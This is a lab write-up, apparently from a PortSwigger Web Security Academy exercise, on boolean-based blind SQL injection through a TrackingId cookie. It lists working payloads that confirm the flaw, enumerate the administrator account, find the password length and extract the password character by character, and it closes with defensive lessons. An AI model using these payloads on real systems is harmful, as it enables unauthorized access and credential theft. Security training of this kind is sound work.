@@ -1,0 +1,95 @@
+Objective
+Exploit a Blind SQL Injection vulnerability using conditional responses to extract the administrator password and gain access to the target account.
+
+Vulnerability Type
+Blind SQL Injection (Boolean-Based)
+Severity: Critical
+
+Injection Point
+Cookie Parameter:
+TrackingId
+
+Discovery Phase
+The application did not:
+
+Display SQL errors
+Return database output
+Reveal backend query results
+
+Instead, application behavior changed depending on whether a database condition evaluated to TRUE or FALSE.
+Indicator:
+TRUE → "Welcome back" displayed
+FALSE → "Welcome back" removed
+
+Initial Verification
+TRUE Condition:
+' AND '1'='1
+Result:
+Welcome back displayed.
+FALSE Condition:
+' AND '1'='2
+Result:
+Welcome back disappeared.
+Conclusion:
+SQL Injection confirmed.
+
+User Enumeration
+Payload:
+' AND (SELECT 'x' FROM users WHERE username='administrator')='x
+Result:
+Welcome back displayed.
+Conclusion:
+Administrator account exists.
+
+Password Length Enumeration
+Payload Template:
+' AND (SELECT LENGTH(password) FROM users WHERE username='administrator')>X--
+Example:
+' AND (SELECT LENGTH(password) FROM users WHERE username='administrator')>19--
+Result:
+TRUE
+Example:
+' AND (SELECT LENGTH(password) FROM users WHERE username='administrator')>20--
+Result:
+FALSE
+Conclusion:
+Administrator password length = 20 characters
+
+Character Extraction
+Payload Template:
+' AND (SELECT SUBSTRING(password,[POSITION],1) FROM users WHERE username='administrator')='[CHAR]
+Method:
+Test each position individually.
+Observe whether the "Welcome back" banner appears.
+TRUE response = Correct character identified.
+
+Tools Used
+
+Firefox
+Burp Suite Repeater
+PortSwigger Web Security Academy
+
+
+Key Lessons Learned
+
+
+Blind SQL Injection does not require visible database output.
+
+
+Small UI changes can act as powerful information leaks.
+
+
+Boolean conditions can be used to extract sensitive data one character at a time.
+
+
+Repeater is often more reliable than automation when dealing with rate limits or Community Edition restrictions.
+
+
+Suppressing SQL errors alone does not eliminate SQL Injection risk.
+
+
+
+Real-World Takeaway
+Applications often attempt to hide database errors and sensitive output.
+However, if application behavior changes based on backend query results, attackers can still infer and extract sensitive information through side-channel responses.
+This demonstrates why parameterized queries and prepared statements remain essential defenses against SQL Injection attacks.
